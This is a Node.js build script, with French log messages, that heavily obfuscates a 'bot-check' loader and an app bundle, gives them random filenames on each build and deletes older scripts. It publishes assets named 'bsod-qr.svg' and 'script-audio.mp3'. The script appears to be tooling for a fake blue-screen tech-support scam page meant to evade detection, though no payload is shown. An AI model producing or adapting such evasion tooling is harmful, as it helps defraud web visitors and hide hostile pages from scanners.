const JavaScriptObfuscator = require("javascript-obfuscator");
const fs = require("fs");
const path = require("path");

const root = __dirname;

const obfuscatorOptions = {
  compact: true,
  controlFlowFlattening: true,
  controlFlowFlatteningThreshold: 1,
  deadCodeInjection: true,
  deadCodeInjectionThreshold: 0.4,
  stringArray: true,
  stringArrayEncoding: ["rc4"],
  stringArrayThreshold: 1,
  stringArrayRotate: true,
  stringArrayShuffle: true,
  stringArrayIndexShift: true,
  stringArrayWrappersCount: 2,
  stringArrayWrappersChainedCalls: true,
  stringArrayCallsTransform: true,
  stringArrayCallsTransformThreshold: 1,
  splitStrings: true,
  splitStringsChunkLength: 2,
  unicodeEscapeSequence: true,
  identifierNamesGenerator: "hexadecimal",
  renameGlobals: false,
  transformObjectKeys: true,
  numbersToExpressions: true,
  disableConsoleOutput: false,
  debugProtection: false,
  selfDefending: false,
  seed: 0,
  reservedNames: [
    "^document$",
    "^window$",
    "^navigator$",
    "^location$",
    "^console$",
  ],
};

function obfuscateFile(inputPath, outputPath) {
  const code = fs.readFileSync(inputPath, "utf8");
  const result = JavaScriptObfuscator.obfuscate(code, obfuscatorOptions);
  fs.writeFileSync(outputPath, result.getObfuscatedCode(), "utf8");
}

function randomScriptName() {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let name = "";
  for (let i = 0; i < 10; i++) {
    name += chars[Math.floor(Math.random() * chars.length)];
  }
  return name + ".js";
}

const publicDir = path.join(root, "public");
fs.mkdirSync(publicDir, { recursive: true });

const loaderName = randomScriptName();
const appName = randomScriptName();

const staticFiles = [
  "bridge.html",
  "bsod-qr.svg",
  "script-audio.mp3",
  "script-audio-2.mp3",
];

console.log("Preparation des fichiers...");

let indexHtml = fs.readFileSync(path.join(root, "index.html"), "utf8");
indexHtml = indexHtml.replace(/bot-check\.js/g, loaderName);
fs.writeFileSync(path.join(publicDir, "index.html"), indexHtml);

let loader = fs.readFileSync(path.join(root, "bot-check.js"), "utf8");
loader = loader.replace(/__APP_BUNDLE__/g, appName);
const loaderTmp = path.join(root, ".bot-check.build.js");
fs.writeFileSync(loaderTmp, loader);

let styles = fs.readFileSync(path.join(root, "styles.css"), "utf8");
styles = styles.replace(/\/\*[\s\S]*?\*\//g, "").replace(/\s+/g, " ").trim();
fs.writeFileSync(path.join(publicDir, "styles.css"), styles);

const audioFallbackDir = path.join(root, "..");

for (const file of staticFiles) {
  let src = path.join(root, file);
  if (!fs.existsSync(src) && file.endsWith(".mp3")) {
    const fallback = path.join(audioFallbackDir, file);
    if (fs.existsSync(fallback)) {
      fs.copyFileSync(fallback, src);
      src = path.join(root, file);
    }
  }
  if (fs.existsSync(src)) {
    fs.copyFileSync(src, path.join(publicDir, file));
  } else if (file.endsWith(".mp3")) {
    console.warn("Attention : fichier audio manquant -> " + file);
  }
}

console.log(`Obfuscation loader -> ${loaderName}...`);
obfuscateFile(loaderTmp, path.join(publicDir, loaderName));

console.log(`Obfuscation app -> ${appName}...`);
obfuscateFile(path.join(root, "app.js"), path.join(publicDir, appName));

fs.unlinkSync(loaderTmp);

const oldJs = fs.readdirSync(publicDir).filter((f) => {
  return f.endsWith(".js") && f !== loaderName && f !== appName;
});
for (const f of oldJs) {
  fs.unlinkSync(path.join(publicDir, f));
}

console.log("Termine : code obfusque et noms de fichiers regeneres.");
